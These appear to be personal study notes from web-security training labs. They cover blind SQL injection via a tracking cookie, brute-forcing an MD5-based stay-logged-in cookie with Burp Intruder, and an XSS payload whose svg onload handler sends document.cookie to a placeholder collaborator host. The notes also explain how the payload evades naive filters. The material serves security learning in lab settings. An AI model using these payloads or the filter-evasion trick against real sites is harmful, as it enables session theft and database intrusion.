## SQLi Vulnerabilities:
Can insert apostrophe into Cookie header parameter to test. Example of blind SQLi:
> [!test for:]
> 
Cookie: TrackingId=UAVIphJ7sSZqwiPA' AND '1' ='1`
Cookie: TrackingId=UAVIphJ7sSZqwiPA' AND '1' ='2

## Authentication Vulnerabiltiies
- ==Brute-forcing a stay-logged-in cookie==
  Log in as wiener. Examine the stay-logged in cookie - it's a base64 string. Decoding in base64 reveals that this is wiener:[some string]
  
  Crack the hash and find that this is an MD5 hash. Craft python script to hash, concatenate with carlos:, and then base64 encode each candidate password.
  
  Use this list of strings to brute-force (Intruder) the stay-logged-in cookie.

## XSS Vulnerabilities
- ==Scanning non-standard data structures==
  Log in as wiener and check the session cookie has wiener in plaintext. Highlight wiener and scan selected insertion point; Burpsuite will show that it is vulnerable to XSS. Use the following payload to steal the admin user's cookie.
  
  '"><svg/onload=fetch(`//OASTIFY_COLLABORATOR/${encodeURIComponent(document.cookie)}`)>%3aCURRENT_COOKIE
  
  That slash is a trick used in HTML parsing—not a requirement of SVG itself. it doesn’t treat the `/` as anything special like a closing tag. Why it works In HTML (not strict XML/XHTML), tag syntax is **loosely parsed**. Characters like `/` between the tag name and attributes are often ignored or treated as whitespace. So `<svg/onload=...>` becomes a valid `<svg>` element with an `onload` attribute. This pattern shows up in XSS payloads because: It can **bypass naive filters** that only look for `<svg onload=...>` with a space. Some sanitizers don’t expect `/` there and fail to block it.